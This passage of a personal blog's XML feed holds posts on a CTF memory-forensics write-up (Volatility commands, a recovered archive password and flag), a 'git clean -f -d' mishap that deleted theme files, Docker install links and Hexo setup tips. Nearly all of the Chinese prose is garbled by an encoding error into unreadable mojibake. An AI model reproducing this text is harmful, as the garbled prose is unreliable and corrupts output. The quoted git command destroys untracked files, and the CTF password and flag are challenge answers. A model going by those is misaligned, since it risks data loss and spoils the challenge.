<p>é™·è¿›å»çš„æ—¶å€™ï¼Œé‚£é“é¢˜å·²ç»è¢«è§£å‡ºæ¥äº†ï¼Œç„¶åå°±ä¸æƒ³åšäº†ã€‚ã€‚ï¼ˆå°ç™½è¿˜æ˜¯å°ç™½ã€‚ã€‚</p>
<p>å…³é”®è¿›ç¨‹åº”è¯¥æ˜¯explorer.exeå’Œcmd.exe</p>
<p>å…ˆå»æå–å†…å­˜ä¸­ä¿ç•™çš„ cmd å‘½ä»¤ä½¿ç”¨æƒ…å†µ</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/10.png" src="/img/loading.gif" class="lazyload"></a>

<p>å‘ç°passwdï¼š<code>weak_auth_top100</code></p>
<p>ç„¶åç”¨iehistoryæŸ¥çœ‹ieæµè§ˆå™¨ä½¿ç”¨æƒ…å†µå‘ç°æ²¡æœ‰ä¿¡æ¯ï¼Œäºæ˜¯ç”¨editboxæŸ¥çœ‹è¾“å…¥æ¡†ä¿¡æ¯</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/9.png" src="/img/loading.gif" class="lazyload"></a>

<p>å‘ç°ieè®¿é—®çš„åœ°å€æ˜¯ â€œC:\Documents and Settings\Administratorâ€</p>
<p>äºæ˜¯ç”¨filescanæœç´¢æ–‡ä»¶ï¼Œgrepè¿‡æ»¤åŒ…å«<code>Administrator</code>çš„åœ°å€</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 filescan | grep <span class="string">"Administrator"</span></span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/11.png" src="/img/loading.gif" class="lazyload"></a>

<p>å‘ç°flag.imgï¼Œæå–å‡ºæ¥</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f data.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -n --dump-dir=./</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>å…¶å®å½“æ—¶æˆ‘ä¹Ÿè¿‡æ»¤äº†å¥½å¤šã€‚ã€‚ä½†æ˜¯è¿‡æ»¤çš„éƒ½æ˜¯zipã€rarã€pngã€jpgã€txtã€pacpå•¥çš„ã€‚ã€‚æ²¡æƒ³è¿‡imgæ–‡ä»¶ï¼ˆå…¶å®è¿‡æ»¤flagä¹Ÿè¡Œ</p>
<p>å¾—åˆ°æ–‡ä»¶file.None.0xff425090.datï¼Œä¿®æ”¹åç¼€ä¸ºimgï¼ŒæŠŠé‡Œé¢çš„ä¸œè¥¿æå–ä¸€ä¸‹</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/03/09/xctf-misc-wp/13.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œå¯†ç å°±æ˜¯<code>weak_auth_top100</code>ï¼ˆæˆ‘è¿˜ä»¥ä¸ºæ˜¯å¼±å£ä»¤çˆ†ç ´ï¼Œè¯•äº†ä¸¤ç»„åå°±æ”¾å¼ƒäº†</p>
<p>è§£å‹å¾—åˆ°usbdata.txt ï¼Œç½‘ä¸Šæœ‰è„šæœ¬å¯ä»¥åˆ†æï¼Œè´´ä¸ª<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html" target="_blank" rel="noopener">ç½‘å€</a>ï¼Œå¤§ä½¬åˆ†æçš„æŒºå…¨é¢çš„</p>
<p>è„šæœ¬è·‘å®Œåå¾—åˆ°flag</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;69200835784ec3ed8d2a64e73fe913c0&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="æ­¦æ±‰åŠ æ²¹"><a href="#æ­¦æ±‰åŠ æ²¹" class="headerlink" title="æ­¦æ±‰åŠ æ²¹"></a>æ­¦æ±‰åŠ æ²¹</h4><p>èƒ½åŠ›ä¸å¤Ÿï¼Œè¿™ä¸ªæ˜¯çœŸä¸ä¼šï¼ˆæŒºæ­£èƒ½é‡ä¸€é¢˜ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆ</p>
<p>æå–åˆ°flag.exeå°±ä¸ä¼šäº†ï¼ŒIDAåˆ†æä¸ä¼šã€‚ã€‚è¿è¡Œçš„æ—¶å€™å€’æ˜¯å‘ç°å…­ä¸ªè¾“å…¥æ¥å›è½¦åä¼šè¾“å‡ºä¸€äº›æ— è§„åˆ™å­—ç¬¦ã€‚ã€‚</p>
<p>èµ›åè®¨è®ºçš„æ—¶å€™æ‰çŸ¥é“åŠ äº†ä¸ªVMPå£³ï¼Ÿã€‚ã€‚</p>
<p>ç„¶åç¾¤é‡Œçš„å¸ˆå‚…å‘ç°äº†è¿™ä¸ª</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.png" src="/img/loading.gif" class="lazyload"></a>

<p>è¿˜æœ‰è¿™ä¸ª</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/09/xctf-misc-wp/15.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>miscæ–°é¢˜å‹è§£é”ï¼šå¼€å¿ƒçŒœçŒœçŒœï¼</p>
<p>æœ€åæˆ‘ï¼š</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/09/xctf-misc-wp/16.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>äºŒæ›´ï¼šå®˜æ–¹wp</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/09/xctf-misc-wp/17.png" src="/img/loading.gif" class="lazyload"></a>

<p>å…¶ä¸­ç”¨steghideçˆ†ç ´çš„å¯†ç ä¸ºï¼šctf</p>
<p>u1s1ï¼Œè¿˜ä¸å¦‚å»çŒœflagâ€¦â€¦..</p>
<p>&nbsp;</p>
<p>å¸Œæœ›ä¸‹æ¬¡miscèƒ½å¤šåšå‡ºæ¥å‡ é“ï¼Œå˜¿å˜¿å˜¿ï¼</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>xctf</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡è‡ªé—­ç»å†</title>
    <url>/2020/03/07/A-painful-experience/</url>
    <content><![CDATA[<p>è®°æ˜¨æ™šæˆ‘çš„ä¸€æ¬¡æƒ¨ç—›ç»å†</p>
<h4 id="äº‹ä»¶ç»è¿‡"><a href="#äº‹ä»¶ç»è¿‡" class="headerlink" title="äº‹ä»¶ç»è¿‡"></a>äº‹ä»¶ç»è¿‡</h4><p>å› ä¸ºæˆ‘æ˜¯åœ¨æœåŠ¡å™¨å’ŒGithubä¸ŠåŒæ—¶æ›´æ–°åšå®¢çš„ï¼Œæ‰€ä»¥åœ¨æ˜¨å¤©é…ç½®å®Œå–„å¥½æ–°åŠ çš„ä¸»é¢˜å</p>
<p>å…ˆdeployåˆ°äº†Gitpageä¸Šï¼Œå¯ä»¥ã€ä¸é”™å¾ˆæˆåŠŸï¼Œç„¶åå°±æ˜¯å¾€æœåŠ¡å™¨ä¸Šæ”¾äº†</p>
<p>å—¯ï¼Œhexo clean g dä¸€æ°”å‘µæˆã€‚ã€‚ã€‚è®¿é—®ç½‘ç«™ã€‚ã€‚ã€‚</p>
<p>ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p>
<p>æ­¤æ—¶é—®é¢˜å‡ºç°äº†ï¼Œç½‘ç«™å†…å®¹æ²¡æ›´æ–°ï¼ï¼ï¼</p>
<p>å†åˆ·æ–°å‡ æ¬¡è¯•è¯•ã€‚ã€‚ã€‚è¿˜æ˜¯æ²¡æœ‰ï¼ï¼ï¼ï¼</p>
<p>å›æ¥å†éƒ¨ç½²ä¸€æ¬¡ï¼ä¸€å®šæ˜¯å§¿åŠ¿ä¸å¯¹ï¼</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>æ·¦ï¼ï¼ä¸ºå•¥è¿˜æ˜¯æ²¡æœ‰ï¼Œç ”ç©¶ä¸€ä¸‹hexo dä¹‹åçš„å†…å®¹ã€‚ã€‚</p>
<p>â€œBranch â€˜masterâ€™ set up to track remote branch â€˜masterâ€™ fromâ€ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p>
<p>ç™¾åº¦ä¸€ä¸‹ï¼Œå¥¥ï¼ï¼åŸæ¥æ˜¯åˆ†å‰äº†ï¼Œæ“ä½œä¸€ç•ªã€‚ã€‚ã€‚ã€‚</p>
<p>åœ¨ä¸€çªä¸é€šçš„æƒ…å†µä¸‹è¯•éªŒäº†statusã€commitã€mergeã€branchã€addã€pushã€checkoutã€pushâ€¦â€¦â€¦</p>
<p>å˜¿ï¼è¿˜æ˜¯ä¸è¡Œï¼Ÿï¼Ÿè¿™æ—¶ä¸€æ®µä»£ç æ¥äº†ï¼ï¼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clean -f -d</span><br></pre></td></tr></table></figure></div>

<p>å°±æ˜¯å®ƒï¼ï¼å°±æ˜¯å®ƒï¼ï¼å®ƒæ‘§æ¯äº†æˆ‘çš„hexoï¼Œå®ƒåˆ æ‰äº†æˆ‘è¾›è¾›è‹¦è‹¦é…ç½®äº†å¾ˆä¹…çš„nextå’Œbutterfly</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>ç¬¬ä¸€ååº”wocï¼ï¼ï¼èµ¶ç´§å»å›æ”¶ç«™çœ‹çœ‹ï¼Œæœ‰æ•‘æ²¡ï¼Ÿï¼Ÿæœ‰æ•‘æ²¡ï¼Ÿï¼Ÿï¼Ÿ</p>
<p>æ²¡æœ‰äº†ï¼ï¼ï¼5555è‰5555ï¼ï¼ï¼</p>
<p>äºæ˜¯æ‚²ä¼¤åœ°å¸æ‰hexoæ‰“ç®—é‡æ–°æ¥è¿‡</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>ä½†æ˜¯å†ä¸‹ä¸‹æ¥åï¼Œå‘ç°hexo sè¿TMè‡ªå·±æœ¬åœ°çš„4000ç«¯å£éƒ½çœ‹ä¸æ¥äº†ï¼ï¼ï¼ˆæ€¥äº†æ€¥äº†è„‘å­æ²¡äº†</p>
<p>é‚£æ—¶å€™å·²ç»ä¸€ç‚¹å¤šäº†ï¼Œæˆ‘æ‚²ä¼¤åœ°å‘å‡ºäº†ä¸€ç¯‡çºªå¿µæˆ‘çŸ­æš‚åšå®¢ç”Ÿæ¶¯çš„è¯´è¯´</p>
<p>é‚£æ—¶å·²ç»åœ¨çœ‹Ghostæ€ä¹ˆæ­å»ºäº†ï¼ˆä½†æ˜¯è¯´çœŸçš„è¿˜æ˜¯æ”¾ä¸ä¸‹hexoï¼Œä½œä¸šé‚£ä¹ˆå¤šï¼Œä¹Ÿæ²¡æœ‰é‡å¤´å†æ¥çš„å‹‡æ°”äº†</p>
<p>è¿™æ—¶ä¸€ä½å­¦å§çš„è¯„è®ºï¼Œåˆè®©æˆ‘çœ‹åˆ°blogè½¬ç”Ÿçš„å¸Œæœ›</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>DiskGeniusæ–‡ä»¶æ•°æ®æ¢å¤å·¥å…·ï¼Œç„¶åå°±å»æ‰«æˆ‘çš„ç£ç›˜</p>
<p>ä½†æ˜¯æœ‰ç”¨çš„åªæ‰¾åˆ°äº†ä¸€éƒ¨åˆ†ï¼Œå¾ˆå¤šéƒ½ä¸¢äº†ï¼ˆåƒstylæ–‡ä»¶ã€ymlæ–‡ä»¶</p>
<p>æ¯”è¾ƒæƒŠå–œçš„è¿˜æ˜¯æŠŠè‡ªå·±ä¹‹å‰å‘åšå®¢å†™çš„mdæ–‡ä»¶æ‰¾åˆ°äº†ï¼ˆå¾ˆé‡è¦ï¼Œæ²¡è¿™ä¸ªæˆ‘è´¼éš¾å—ï¼Œæ‡’å¾—copyäº†</p>
<p>è¿™æ—¶æ—¶é—´æ¥åˆ°äº†3ç‚¹å¤šé’Ÿï¼Œæˆ‘ä¸ç”˜å¿ƒçš„ç¡ä¸‹äº†ï¼Œä»¿ä½›çœ‹å¼€äº†ï¼Œå…¶å®è„‘å­é‡Œå…¨éƒ½æ˜¯</p>
<p>â€œBranch â€˜masterâ€™ set up to track remote branch â€˜masterâ€™ fromâ€ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>æ—¶é—´æ¥åˆ°äº†ä»Šå¤©ï¼Œæ—©ä¸Šçˆ¬èµ·æ¥æ°´äº†é“æˆ˜ç–«çš„miscåã€‚ã€‚</p>
<p>æ·¦ï¼æˆ‘ä¸ç”˜å¿ƒï¼çˆ·è¦ä»å¤´å¼€å§‹ï¼ï¼ï¼ï¼ˆmdï¼Œè¦ä¸æ˜¯è¿™äº‹ï¼Œæˆ‘OSå®éªŒä¸€åº”è¯¥å†™çš„å·®ä¸å¤šäº†</p>
<p>ç»è¿‡ä¸€ä¸‹åˆçš„å¤åŸã€‚ã€‚ã€‚ã€‚æˆ‘åŠªåŠ›æŠŠå®ƒå˜æˆäº†åŸæ¥çš„æ ·å­ã€‚ã€‚ã€‚ã€‚</p>
<p>hexo clean g dã€‚ã€‚ï¼ï¼ï¼Ÿï¼Ÿè¿˜æ˜¯ä¹‹å‰çš„æ ·å­ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p>
<p>è¿™æ¬¡åˆå»ç ”ç©¶äº†ä¸‹åˆ†å‰ï¼Œåˆ‡åˆ°.deploy<code>git branch -a</code>ã€‚ã€‚ã€‚å°±ä¸€ä¸ªmasterå‘€</p>
<p><code>ssh -v git@xx.xx.xx.xx</code>åœ¨æœåŠ¡å™¨é‡Œåˆ‡åˆ°blog.gitã€‚ã€‚ã€‚å°±ä¸€ä¸ªmasterå‘€</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>WinSCPè¿ä¸ŠæœåŠ¡å™¨ï¼Œçœ‹ä¸€ä¸‹æ–‡ä»¶æ›´æ–°æ—¶é—´ï¼Ÿï¼Ÿæ˜¯ä»Šå¤©ä¸‹åˆå•Šï¼æ²¡é”™å‘€ï¼</p>
<p>æ­¤æ—¶çš„æˆ‘æ„è¯†åˆ°äº†é—®é¢˜çš„ä¸å¯¹åŠ²</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>æ¯æ¬¡åœ¨Edgeè¿›åšå®¢è¿›å¾—éƒ½å¾ˆå¿«ï¼Œæˆ‘çŸ¥é“å¯èƒ½æ˜¯æœ‰ç¼“å­˜ä¹‹ç±»çš„ï¼Œä½†æ˜¯æ¸…é™¤ç¼“å­˜åå¥½åƒæ²¡å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨</p>
<p>äºæ˜¯æˆ‘æ‰“ç®—æ¢ä¸€ä¸ªæµè§ˆå™¨è¿›å…¥ä¸€ä¸‹æˆ‘çš„åšå®¢ï¼ˆ  Firefoxå¯åŠ¨ï¼ŒGoogleå¯åŠ¨</p>
<p>è¿›å…¥åšå®¢ã€‚ã€‚æ— æ³•è®¿é—®ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p>
<p>æ¢ä¸€ä¸ªå­åŸŸåï¼Œè¿›å»äº†ï¼æ›´æ–°äº†ï¼ï¼ï¼Ÿï¼Ÿ</p>
<p>æˆ‘çªç„¶æƒ³åˆ°äº†æˆ‘æ˜¨å¤©ä¸‹åˆæçš„éªšä¸œè¥¿â€”â€”CDNï¼Œå¥½åƒæ²¡æå®Œå°±æ”¾é‚£ä¸ç®¡äº†</p>
<p>æ¥ä¸‹æ¥æˆ‘å‘ç°æˆ‘çš„åŸŸåè§£ææš‚åœäº†æ²¡å¼€ï¼ŒCDNæš‚åœäº†æ²¡åˆ </p>
<p>çœŸç›¸åªæœ‰ä¸€ä¸ª</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>

<p>Edgeæ˜¯ä¸ª éšä¾¿ï¼ï¼ï¼ˆå¥½å§ï¼Œå…¶å®æ˜¯æˆ‘èœï¼Œä½†æ˜¯edgeæµè¿™ä¸ªè§ˆå™¨è¿æˆ‘åŸŸåæ²¡å¼€è§£æéƒ½èƒ½è¿›å»çš„æœºåˆ¶å±å®æ¶å¿ƒ</p>
<p>è¿˜æœ‰å°±æ˜¯ä¸ºå•¥æˆ‘æ‹¿dlè¿›å»æ˜¯æ›´æ–°çš„çŠ¶æ€ï¼Œè‡ªå·±çš„ipå´ä¸æ›´æ–°çš„ï¼ˆæˆ‘å’‹è§‰å¾—è¿˜è·Ÿä¸Šæ¬¡æ‰«ç›®å½•æœ‰å…³ã€‚ã€‚</p>
<p>&nbsp;</p>
<p>ä»¥åä¸€å®šè¦æå‰å¤‡ä»½ï¼ï¼</p>
<p>è¿˜æœ‰åœ¨è¿™æ’ä¸ªçœ¼ï¼Œä»¥åå†åœ¨gitä¸ŠçŠ¯é‡å¤§é”™è¯¯å°±Tå›æ¥æ‰‡è‡ªå·±</p>
<p><a href="https://www.runoob.com/git/git-tutorial.html" target="_blank" rel="noopener">Git èœé¸Ÿæ•™ç¨‹</a></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>cdn</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerå®‰è£…(learning)</title>
    <url>/2020/03/02/Docker-learning/</url>
    <content><![CDATA[<p>ä¸‰æˆ˜Centos è½¬win10ï¼Œç„¶è€Œè·Ÿè™šæ‹Ÿæœºå†²çªï¼Œå†å›å»å‘—</p>
<p>è¿˜æœ‰å› ä¸ºé¡¹ç›®è¦ç”¨åˆ°ï¼Œé¢å¯¹ç°å®å°±å®Œäº†</p>
<a id="more"></a>

<hr>
<h5 id="äº‹ä»¶è®°å½•"><a href="#äº‹ä»¶è®°å½•" class="headerlink" title="äº‹ä»¶è®°å½•"></a>äº‹ä»¶è®°å½•</h5><p>curlå¤ªæ…¢ï¼ˆå¡ç€å¡ç€åœäº†ï¼‰ã€python2é€€ä¼‘ï¼ˆç¡®å®ä¸æ–¹ä¾¿ï¼‰ã€pipå®‰è£…ä¸æˆåŠŸ</p>
<p>æƒé™èµ‹äºˆ chmodã€æ•™ç¨‹æ²¡å•¥è¯´çš„ä¸‹é¢æŒºå…¨</p>
<p>å­¦ä¹ è¿‡ç¨‹å†æ›´ï¼Œï¼ˆä¼—æ‰€å‘¨çŸ¥ï¼Œå®‰è£…â‰ˆå­¦ä¼šï¼‰</p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload" title></a></p>
<h5 id="ç›¸å…³ç½‘å€ï¼š"><a href="#ç›¸å…³ç½‘å€ï¼š" class="headerlink" title="ç›¸å…³ç½‘å€ï¼š"></a>ç›¸å…³ç½‘å€ï¼š</h5><p><a href="https://blog.csdn.net/deng624796905/article/details/86493330" target="_blank" rel="noopener">Dockerå…¥é—¨</a></p>
<p><a href="https://blog.csdn.net/zzq060143/article/details/91050272" target="_blank" rel="noopener">Win10ä¸­dockerçš„å®‰è£…ä¸ä½¿ç”¨</a></p>
<p><a href="https://blog.csdn.net/weixin_44725156/article/details/104403204" target="_blank" rel="noopener">Centos7å®‰è£…Docker Compose(pipæ–¹å¼å®‰è£…)</a></p>
<h5 id="æ‚è®°"><a href="#æ‚è®°" class="headerlink" title="æ‚è®°"></a>æ‚è®°</h5><p>è™½ç„¶è‡ªå·±çš„åšå®¢ä¹Ÿæ²¡å•¥è·Ÿå¤–ç•Œçš„å¯†ç èµ„æ–™ä¼ è¾“ï¼Œä½†è¿˜æ˜¯æ¢äº†ä¸ªhttpsï¼Œå®‰å…¨å°±å®Œäº‹äº†ï¼Œ<a href="https://www.jianshu.com/p/8046a12fec4a" target="_blank" rel="noopener">æ•™ç¨‹</a></p>
<p>ä¸è¦æ‰«è‡ªå·±çš„aliæœåŠ¡å™¨ï¼Œä¼šå°ä¸€æ®µæ—¶é—´ip</p>
<p>ä¸€ä¸ªæ–°å…¬æµ‹çš„CTFç½‘ç«™  <a href="https://www.ctfhub.com/" target="_blank" rel="noopener">ctfhub</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-misc-wp</title>
    <url>/2020/03/01/buuctf-misc-wp/</url>
    <content><![CDATA[<p>è¿™ç¯‡blogæ¥è®°å½•åœ¨BUUCTFä¸Šåšçš„ä¸€äº›æœ‰è¶£çš„miscé¢˜ã€‚ï¼ˆéƒ¨åˆ†wpï¼ŒæŒç»­æ›´æ–°ingï¼‰</p>
<p>å­¦å•¥webï¼Œmiscä¸å¥½ç©äº†å—ï¼Ÿ</p>
<a id="more"></a>

<p>ä¸ç€æ€¥ï¼Œæœ‰æ—¶é—´å°±å†™</p>
<p>å¤ªå¤šäº†ï¼Œå…ˆå’•ç€</p>
]]></content>
      <categories>
        <category>Write_up</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog</title>
    <url>/2020/02/15/My-first/</url>
    <content><![CDATA[<p>æ­¤ç¯‡çºªå¿µä¸€ä¸‹BTISåšå®¢çš„æˆåŠŸæ­å»ºã€‚<!--è‚¯å®šä¸æ˜¯å› ä¸ºæˆ‘å¤ªèœï¼Œæ— fkå†™--></p>
<p>Completedï¼Ÿ&emsp; Noï¼ŒThis is just the beginningï¼</p>
<a id="more"></a>

<hr>
<p>è¿™é‡Œè®²è®²æˆ‘æ­å»ºåœ°æ—¶å€™é‡åˆ°çš„é—®é¢˜å§ï¼š</p>
<h3 id="ä¸»é¢˜é€‰æ‹©"><a href="#ä¸»é¢˜é€‰æ‹©" class="headerlink" title="ä¸»é¢˜é€‰æ‹©"></a>ä¸»é¢˜é€‰æ‹©</h3><p>æœ¬æ¥é€‰çš„æ˜¯Miccallï¼Œå‘ç°ç½‘ä¸Šè¿™ç§ç»„ä»¶æ·»åŠ å’Œæ‹“å±•çš„æ•™ç¨‹æœ‰ç‚¹å°‘ï¼Œæœ€åè¿˜æ˜¯é€‰æ‹©äº†<del>æœ€å¤§ä¼—çš„Nextä¸»é¢˜</del>butterflyï¼ˆäºŒæ›´ã€‚<del>ï¼ˆåŠŸèƒ½é‚£ä¹ˆå¤šã€æ•™ç¨‹é‚£ä¹ˆå¤šï¼Œå®ƒä¸é¦™å—ï¼Ÿ</del>ï¼ˆæ’ä»¶æ’å¾—å†å¤šè¿˜æ˜¯æœ‰ã€ä¸‘ï¼Œä¾¿æ·æ— æ³•æˆ˜èƒœæˆ‘çš„å®¡ç¾â€¦â€¦butterflyçœŸé¦™</p>
<h3 id="npmæ¢æº"><a href="#npmæ¢æº" class="headerlink" title="npmæ¢æº"></a>npmæ¢æº</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure></div>

<p>æ¢æˆæ·˜å®çš„æºä¼šå¥½å¾ˆå¤š</p>
<h3 id="è‡ªå®šä¹‰é…ç½®æ–‡ä»¶"><a href="#è‡ªå®šä¹‰é…ç½®æ–‡ä»¶" class="headerlink" title="è‡ªå®šä¹‰é…ç½®æ–‡ä»¶"></a>è‡ªå®šä¹‰é…ç½®æ–‡ä»¶</h3><p>å¦‚æœæƒ³è‡ªå®šä¹‰ä¸€äº›è‡ªå·±çš„æ ·å¼ï¼Œè€Œä½ çš„ç‰ˆæœ¬æ°æ˜¯Next7.Xçš„è¯ï¼ˆç›®å‰æœ€æ–°çš„Nextï¼‰ã€‚ä½ ä¼šå‘ç°å¾ˆå¤šæ–‡ç« ä¸­æåŠçš„customæ–‡ä»¶ï¼ˆå¯ä»¥è‡ªç”±ç¼–è¾‘æ ·å¼çš„ä¸€ä¸ªæ–‡ä»¶ï¼‰æ²¡æœ‰äº†ã€‚è¿™æ—¶ä½ å¯ä»¥åœ¨æ ¹ç›®å½•ä¸‹çš„sourceæ–‡ä»¶ä¸‹é¢æ–°å»ºä¸€ä¸ª_dataæ–‡ä»¶å¤¹ï¼Œç„¶ååœ¨é‡Œé¢æ–°å»ºå»ºä¸€ä¸ªstyles.stylï¼Œå¹¶åœ¨ä¸»é¢˜é…ç½®é‡Œè®¾ç½®ä¸€ä¸‹ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè¿™æ ·ä½ å°±å¯ä»¥åœ¨é‡Œé¢åŠ ä¸€äº›è‡ªå®šä¹‰çš„ä»£ç äº†ã€‚</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>



<h3 id="æ³¨æ„ç”¨æˆ·åˆ‡æ¢"><a href="#æ³¨æ„ç”¨æˆ·åˆ‡æ¢" class="headerlink" title="æ³¨æ„ç”¨æˆ·åˆ‡æ¢"></a>æ³¨æ„ç”¨æˆ·åˆ‡æ¢</h3><p>åœ¨å¾€æœåŠ¡å™¨éƒ¨ç½²æ—¶æ³¨æ„gitç”¨æˆ·å’Œrootç”¨æˆ·çš„åˆ‡æ¢ï¼Œ<a href="https://blog.csdn.net/baiyuwujia/article/details/80648554?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">æ³¨æ„ä¸€ä¸‹gitçš„é»˜è®¤ç›®å½•</a>ã€‚è¿˜æœ‰å°±æ˜¯å…¬é’¥ä¼ é€’ï¼Œå¦‚æœä¹‹å‰ä¼ é€’è¿‡ï¼Œè®°å¾—åˆ é™¤æœ¬åœ°ç”µè„‘.sshé‡Œé¢çš„known_hostsæ–‡ä»¶ã€‚ï¼ˆä¹Ÿè®¸åªæœ‰æˆ‘è¿™ç§ä¸æ‡‚Linuxçš„å°ç™½ä¼šè¸©è¿™ç§å‘å§ï¼‰</p>
